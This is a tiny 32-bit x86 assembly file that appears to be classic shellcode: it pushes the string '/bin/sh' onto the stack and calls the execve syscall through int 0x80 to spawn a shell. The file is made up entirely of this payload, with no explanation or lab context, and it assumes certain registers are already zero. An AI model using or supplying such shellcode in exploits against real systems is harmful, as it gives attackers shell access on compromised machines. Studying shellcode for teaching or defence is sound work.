BITS 32
global _start

_start:
  push ecx
  push 0x68732f2f ; hs//
  push 0x6e69622f ; nib/

  mov ebx,esp     ; /bin/sh
  mov eax,0x0b    ; sys_execve
  int 0x80
